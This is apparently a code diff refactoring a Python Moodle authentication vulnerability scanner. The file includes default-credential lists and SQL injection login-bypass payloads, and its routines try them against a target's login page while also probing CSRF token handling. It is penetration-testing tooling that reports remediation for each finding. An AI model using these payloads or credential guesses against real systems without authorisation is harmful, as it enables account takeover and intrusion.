@@ -10,45 +10,83 @@ import re
 import requests
 import logging
 import time
-import random
-import string
+from typing import Dict, List, Optional, Any, Union, Tuple, Set
+from requests.exceptions import RequestException, Timeout, ConnectionError
 from bs4 import BeautifulSoup
 import urllib.parse
 import json
+import hashlib
 
 class MoodleAuthTester:
-    """Class for testing authentication vulnerabilities in Moodle"""
+    """Class for testing authentication vulnerabilities in Moodle LMS installations"""
     
-    def __init__(self, target_url, logger=None, username=None, password=None, 
-                 timeout=30, proxy=None, cookies=None, delay=0):
-        """Initialize the Moodle authentication tester"""
-        self.target_url = target_url
+    def __init__(
+        self, 
+        target_url: str, 
+        logger: Optional[logging.Logger] = None, 
+        username: Optional[str] = None, 
+        password: Optional[str] = None, 
+        timeout: int = 30, 
+        proxy: Optional[str] = None, 
+        cookies: Optional[Dict[str, str]] = None, 
+        delay: float = 0,
+        user_agent: Optional[str] = None,
+        verify_ssl: bool = True
+    ) -> None:
+        """Initialize the Moodle authentication tester
+        
+        Args:
+            target_url: Target Moodle URL
+            logger: Logger instance
+            username: Username for authentication tests
+            password: Password for authentication tests
+            timeout: Request timeout in seconds
+            proxy: Proxy URL
+            cookies: Dictionary of cookies
+            delay: Delay between requests in seconds
+            user_agent: User agent string to use
+            verify_ssl: Whether to verify SSL certificates
+        """
+        self.target_url = target_url.rstrip('/')
         self.username = username
         self.password = password
         self.timeout = timeout
         self.proxy = proxy
-        self.cookies = cookies
+        self.cookies = cookies or {}
         self.delay = delay
-        self.version_info = None
+        self.user_agent = user_agent
+        self.verify_ssl = verify_ssl
+        self.version_info: Optional[Dict[str, Any]] = None
         
-        # Common test credentials
-        self.test_credentials = [
-            {"username": "admin", "password": "admin"},
-            {"username": "admin", "password": "password"},
-            {"username": "admin", "password": "Password123"},
-            {"username": "admin", "password": "moodle"},
-            {"username": "guest", "password": ""},
-            {"username": "admin", "password": "changeme"}
+        # Common test credentials - format includes description for reporting
+        self.test_credentials: List[Dict[str, str]] = [
+            {"username": "admin", "password": "admin", "description": "default admin credentials"},
+            {"username": "admin", "password": "password", "description": "simple admin password"},
+            {"username": "admin", "password": "Password123", "description": "common admin password"},
+            {"username": "admin", "password": "moodle", "description": "product name as password"},
+            {"username": "guest", "password": "", "description": "empty guest password"},
+            {"username": "admin", "password": "changeme", "description": "temporary default password"}
         ]
         
-        # Common SQL injection patterns for bypassing authentication
-        self.sql_injection_payloads = [
-            {"username": "admin' --", "password": "anything"},
-            {"username": "admin' OR '1'='1' --", "password": "anything"},
-            {"username": "' OR '1'='1' --", "password": "anything"},
-            {"username": "' OR 1=1 --", "password": "anything"},
-            {"username": "admin' OR 1=1 #", "password": "anything"},
-            {"username": "admin'/**/OR/**/1=1/**/--", "password": "anything"}
+        # SQL injection patterns for auth bypass - organized by type
+        self.sql_injection_payloads: List[Dict[str, str]] = [
+            # Comment-based bypasses
+            {"username": "admin' --", "password": "anything", "type": "comment"},
+            {"username": "admin' #", "password": "anything", "type": "comment"},
+            {"username": "admin'/*", "password": "anything", "type": "comment"},
+            
+            # OR-based bypasses
+            {"username": "admin' OR '1'='1' --", "password": "anything", "type": "or_condition"},
+            {"username": "' OR '1'='1' --", "password": "anything", "type": "or_condition"},
+            {"username": "' OR 1=1 --", "password": "anything", "type": "or_condition"},
+            {"username": "admin' OR 1=1 #", "password": "anything", "type": "or_condition"},
+            
+            # Whitespace obfuscation
+            {"username": "admin'/**/OR/**/1=1/**/--", "password": "anything", "type": "obfuscation"},
+            {"username": "admin'%20OR%201=1%20--", "password": "anything", "type": "obfuscation"},
+            
+            # UNION-based attempts
+            {"username": "' UNION SELECT 'admin','password' --", "password": "anything", "type": "union"}
         ]
         
         # Set up logging
@@ -62,21 +100,53 @@ class MoodleAuthTester:
             handler.setFormatter(formatter)
             self.logger.addHandler(handler)
         
-        # Initialize HTTP session
+        # Initialize HTTP session with security settings
         self.session = requests.Session()
+        
+        # Configure the session
         if proxy:
             self.session.proxies = {"http": proxy, "https": proxy}
+        
         if cookies:
             self.session.cookies.update(cookies)
+            
+        # Set a secure default user agent if none provided
+        if user_agent:
+            self.session.headers.update({"User-Agent": user_agent})
+        else:
+            self.session.headers.update({
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+            })
+            
+        # Add security-related headers
+        self.session.headers.update({
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+            "Cache-Control": "max-age=0"
+        })
+        
+        # Tracking for login attempts to prevent account lockouts
+        self._login_attempts: Dict[str, int] = {}
+        self._max_attempts_per_account = 3
     
-    def set_version_info(self, version_info):
-        """Set version information to guide testing"""
+    def set_version_info(self, version_info: Dict[str, Any]) -> None:
+        """Set version information to guide testing
+        
+        Args:
+            version_info: Dictionary containing Moodle version information
+        """
         self.version_info = version_info
+        self.logger.debug(f"Set version info: {version_info.get('version', 'Unknown')}")
     
-    def run_tests(self):
+    def run_tests(self) -> Dict[str, List[Dict[str, Any]]]:
         """
         Run all authentication tests
-        Returns a dictionary with results information
+        
+        Returns:
+            Dictionary with vulnerabilities and information
         """
         self.logger.info("Running authentication vulnerability tests...")
         
@@ -85,110 +155,193 @@ class MoodleAuthTester:
             "info": []
         }
         
-        # Test with provided credentials if available
-        if self.username and self.password:
-            auth_result = self.test_authentication(self.username, self.password)
-            if auth_result:
-                results["info"].append(f"Successfully authenticated with provided credentials ({self.username}).")
-                self.logger.info(f"Successfully authenticated with provided credentials ({self.username}).")
+        try:
+            # Test with provided credentials if available
+            if self.username and self.password:
+                self.logger.info(f"Testing authentication with provided credentials: {self.username}")
+                auth_result = self.test_authentication(self.username, self.password)
+                if auth_result:
+                    results["info"].append({
+                        "title": "Successful Authentication",
+                        "description": f"Successfully authenticated with provided credentials ({self.username}).",
+                        "severity": "Info"
+                    })
+                    self.logger.info(f"Successfully authenticated with provided credentials ({self.username}).")
+            
+            # Test for common credentials
+            weak_credentials = self.test_common_credentials()
+            if weak_credentials:
+                results["vulnerabilities"].append({
+                    "title": "Weak Default Credentials",
+                    "description": f"The Moodle installation uses common or default credentials: {weak_credentials['username']}:{weak_credentials['password']}",
+                    "severity": "Critical",
+                    "evidence": f"Successfully authenticated with {weak_credentials['username']}:{weak_credentials['password']} ({weak_credentials.get('description', '')})",
+                    "remediation": "Change default credentials and implement a strong password policy.",
+                    "cwe": "CWE-521"
+                })
+            
+            # Test for OAuth2 bypass vulnerability
+            oauth_vuln = self.test_oauth2_bypass()
+            if oauth_vuln:
+                results["vulnerabilities"].append(oauth_vuln)
+            
+            # Test for SQL injection in login form
+            sql_vuln = self.test_sql_injection_auth_bypass()
+            if sql_vuln:
+                results["vulnerabilities"].append(sql_vuln)
+            
+            # Test for password reset vulnerabilities
+            reset_vuln = self.test_password_reset_vulnerability()
+            if reset_vuln:
+                results["vulnerabilities"].append(reset_vuln)
+            
+            # Test for authentication bypass via Host header manipulation
+            host_vuln = self.test_host_header_auth_bypass()
+            if host_vuln:
+                results["vulnerabilities"].append(host_vuln)
+            
+            # Test for CSRF token weaknesses
+            token_vuln = self.test_csrf_token_weaknesses()
+            if token_vuln:
+                results["vulnerabilities"].append(token_vuln)
+            
+            # Test for session fixation
+            session_fix_vuln = self.test_session_fixation()
+            if session_fix_vuln:
+                results["vulnerabilities"].append(session_fix_vuln)
+            
+            # Add information about the testing
+            if not results["vulnerabilities"]:
+                results["info"].append({
+                    "title": "Authentication Security",
+                    "description": "No authentication vulnerabilities were found during testing.",
+                    "severity": "Info"
+                })
         
-        # Test for common credentials
-        weak_credentials = self.test_common_credentials()
-        if weak_credentials:
-            results["vulnerabilities"].append({
-                "title": "Weak Default Credentials",
-                "description": f"The Moodle installation uses common or default credentials: {weak_credentials['username']}:{weak_credentials['password']}",
-                "severity": "Critical",
-                "evidence": f"Successfully authenticated with {weak_credentials['username']}:{weak_credentials['password']}",
-                "remediation": "Change default credentials and implement a strong password policy."
+        except Exception as e:
+            self.logger.error(f"Error during authentication testing: {str(e)}")
+            results["info"].append({
+                "title": "Authentication Testing Error",
+                "description": f"An error occurred during authentication testing: {str(e)}",
+                "severity": "Info"
             })
-        
-        # Test for OAuth2 bypass vulnerability
-        oauth_vuln = self.test_oauth2_bypass()
-        if oauth_vuln:
-            results["vulnerabilities"].append(oauth_vuln)
-        
-        # Test for SQL injection in login form
-        sql_vuln = self.test_sql_injection_auth_bypass()
-        if sql_vuln:
-            results["vulnerabilities"].append(sql_vuln)
-        
-        # Test for password reset vulnerabilities
-        reset_vuln = self.test_password_reset_vulnerability()
-        if reset_vuln:
-            results["vulnerabilities"].append(reset_vuln)
-        
-        # Test for authentication bypass via Host header manipulation
-        host_vuln = self.test_host_header_auth_bypass()
-        if host_vuln:
-            results["vulnerabilities"].append(host_vuln)
-        
-        # Test for XSRF token weaknesses
-        token_vuln = self.test_xsrf_token_weaknesses()
-        if token_vuln:
-            results["vulnerabilities"].append(token_vuln)
-        
-        # Test for session fixation
-        session_fix_vuln = self.test_session_fixation()
-        if session_fix_vuln:
-            results["vulnerabilities"].append(session_fix_vuln)
         
         self.logger.info(f"Authentication vulnerability testing completed. Found {len(results['vulnerabilities'])} vulnerabilities.")
         return results
     
-    def test_authentication(self, username, password):
-        """Test authentication with specific credentials"""
-        self.logger.debug(f"Testing authentication with {username}:{password}")
+    def test_authentication(self, username: str, password: str) -> bool:
+        """Test authentication with specific credentials
+        
+        Args:
+            username: Username to test
+            password: Password to test
+            
+        Returns:
+            Boolean indicating if authentication was successful
+        """
+        if not username:
+            return False
+            
+        # Prevent excessive login attempts that might trigger account lockout
+        account_hash = hashlib.md5(username.encode()).hexdigest()
+        if self._login_attempts.get(account_hash, 0) >= self._max_attempts_per_account:
+            self.logger.debug(f"Skipping login for {username} - maximum attempts reached")
+            return False
+            
+        self._login_attempts[account_hash] = self._login_attempts.get(account_hash, 0) + 1
+        
+        self.logger.debug(f"Testing authentication with {username}")
         
         # First, get the login form to extract any tokens
         login_url = f"{self.target_url}/login/index.php"
-        response = self.session.get(login_url, timeout=self.timeout)
         
-        if response.status_code != 200:
-            self.logger.debug(f"Could not access login page: {response.status_code}")
+        try:
+            response = self._safe_request("get", login_url)
+            
+            if not response or response.status_code != 200:
+                self.logger.debug(f"Could not access login page: {response.status_code if response else 'No response'}")
+                return False
+            
+            # Extract login token if present
+            soup = BeautifulSoup(response.text, 'html.parser')
+            token_input = soup.find("input", {"name": "logintoken"})
+            
+            if token_input:
+                logintoken = token_input.get("value", "")
+                self.logger.debug(f"Found logintoken: {logintoken}")
+            else:
+                logintoken = ""
+                self.logger.debug("No logintoken found")
+            
+            # Prepare login data
+            login_data = {
+                "username": username,
+                "password": password,
+                "logintoken": logintoken
+            }
+            
+            # Submit login form
+            if self.delay > 0:
+                time.sleep(self.delay)
+            
+            response = self._safe_request("post", login_url, data=login_data)
+            
+            if not response:
+                return False
+                
+            # Check if login was successful
+            if "loginerrors" in response.text or "Invalid login" in response.text:
+                self.logger.debug(f"Login failed with {username}")
+                return False
+            
+            # Check if redirected to dashboard or my page
+            if "/my/" in response.url or "Dashboard" in response.text or "My courses" in response.text:
+                self.logger.info(f"Login successful with {username}")
+                return True
+            
+            # Additional check for admin access
+            admin_response = self._safe_request("get", f"{self.target_url}/admin/index.php")
+            if admin_response and admin_response.status_code == 200 and "Site administration" in admin_response.text:
+                self.logger.warning(f"Login successful with ADMIN privileges using {username}")
+                return True
+            
             return False
+            
+        except Exception as e:
+            self.logger.error(f"Error during authentication test: {str(e)}")
+            return False
+    
+    def _safe_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
+        """Make a safe HTTP request with error handling and delay
         
-        # Extract login token if present
-        soup = BeautifulSoup(response.text, 'html.parser')
-        token_input = soup.find("input", {"name": "logintoken"})
-        
-        if token_input:
-            logintoken = token_input.get("value", "")
-            self.logger.debug(f"Found logintoken: {logintoken}")
-        else:
-            logintoken = ""
-            self.logger.debug("No logintoken found")
-        
-        # Prepare login data
-        login_data = {
-            "username": username,
-            "password": password,
-            "logintoken": logintoken
-        }
-        
-        # Submit login form
+        Args:
+            method: HTTP method (get, post)
+            url: URL to request
+            **kwargs: Additional arguments for requests
+            
+        Returns:
+            Response object or None if request failed
+        """
         if self.delay > 0:
             time.sleep(self.delay)
-        
-        response = self.session.post(login_url, data=login_data, timeout=self.timeout)
-        
-        # Check if login was successful
-        if "loginerrors" in response.text or "Invalid login" in response.text:
-            self.logger.debug(f"Login failed with {username}:{password}")
-            return False
-        
-        # Check if redirected to dashboard or my page
-        if "/my/" in response.url or "Dashboard" in response.text or "My courses" in response.text:
-            self.logger.info(f"Login successful with {username}:{password}")
-            return True
-        
-        # Additional check for admin access
-        admin_response = self.session.get(f"{self.target_url}/admin/index.php", timeout=self.timeout)
-        if admin_response.status_code == 200 and "Site administration" in admin_response.text:
-            self.logger.warning(f"Login successful with ADMIN privileges using {username}:{password}")
-            return True
-        
-        return False
+            
+        try:
+            kwargs.setdefault('timeout', self.timeout)
+            kwargs.setdefault('verify', self.verify_ssl)
+            
+            response = self.session.request(method, url, **kwargs)
+            return response
+            
+        except Timeout:
+            self.logger.debug(f"Request timeout for {url}")
+        except ConnectionError:
+            self.logger.debug(f"Connection error for {url}")
+        except RequestException as e:
+            self.logger.debug(f"Request error for {url}: {str(e)}")
+        except Exception as e:
+            self.logger.debug(f"Unexpected error during request to {url}: {str(e)}")
+            
+        return None
     
     def test_common_credentials(self):
         """Test if common/default credentials work"""
@@ -457,9 +610,9 @@ class MoodleAuthTester:
         self.logger.info("No Host header authentication bypass vulnerabilities found")
         return None
     
-    def test_xsrf_token_weaknesses(self):
-        """Test for weaknesses in XSRF token implementation"""
-        self.logger.info("Testing for XSRF token weaknesses...")
+    def test_csrf_token_weaknesses(self):
+        """Test for weaknesses in CSRF token implementation"""
+        self.logger.info("Testing for CSRF token weaknesses...")
         
         # Get the login page to extract the token
         login_url = f"{self.target_url}/login/index.php"
@@ -474,26 +627,26 @@ class MoodleAuthTester:
         token_input = soup.find("input", {"name": "logintoken"})
         
         if not token_input:
-            self.logger.warning("No XSRF token found in login form!")
+            self.logger.warning("No CSRF token found in login form!")
             return {
-                "title": "Missing XSRF Protection",
-                "description": "The Moodle login form doesn't include XSRF tokens, making it vulnerable to cross-site request forgery attacks.",
+                "title": "Missing CSRF Protection",
+                "description": "The Moodle login form doesn't include CSRF tokens, making it vulnerable to cross-site request forgery attacks.",
                 "severity": "High",
                 "evidence": "No logintoken field found in the login form.",
-                "remediation": "Update to the latest Moodle version which includes proper XSRF protection."
+                "remediation": "Update to the latest Moodle version which includes proper CSRF protection."
             }
         
         # Check token value
         token = token_input.get("value", "")
         
         if len(token) < 20:
-            self.logger.warning(f"XSRF token appears to be weak (length: {len(token)})")
+            self.logger.warning(f"CSRF token appears to be weak (length: {len(token)})")
             return {
-                "title": "Weak XSRF Token",
-                "description": "The Moodle XSRF tokens appear to be too short, potentially making them easier to guess or brute force.",
+                "title": "Weak CSRF Token",
+                "description": "The Moodle CSRF tokens appear to be too short, potentially making them easier to guess or brute force.",
                 "severity": "Medium",
                 "evidence": f"Login token length is only {len(token)} characters.",
-                "remediation": "Update to the latest Moodle version which includes stronger XSRF protection."
+                "remediation": "Update to the latest Moodle version which includes stronger CSRF protection."
             }
         
         # Test if empty token is accepted
@@ -511,16 +664,16 @@ class MoodleAuthTester:
         # For non-vulnerable systems, submitting an empty token should result in an error
         # If we can still see the login form (username field) without any token error, it might be accepting empty tokens
         if "username" in empty_token_response.text and "Invalid token" not in empty_token_response.text:
-            self.logger.warning("Empty XSRF token accepted!")
+            self.logger.warning("Empty CSRF token accepted!")
             return {
-                "title": "XSRF Protection Bypass",
-                "description": "The Moodle installation appears to accept empty XSRF tokens, making it vulnerable to cross-site request forgery attacks.",
+                "title": "CSRF Protection Bypass",
+                "description": "The Moodle installation appears to accept empty CSRF tokens, making it vulnerable to cross-site request forgery attacks.",
                 "severity": "High",
                 "evidence": "The system processed a login form with an empty token without reporting a token error.",
-                "remediation": "Update to the latest Moodle version and ensure proper XSRF protection is configured."
+                "remediation": "Update to the latest Moodle version and ensure proper CSRF protection is configured."
             }
         
-        self.logger.info("No XSRF token weaknesses found")
+        self.logger.info("No CSRF token weaknesses found")
         return None
     
     def test_session_fixation(self):
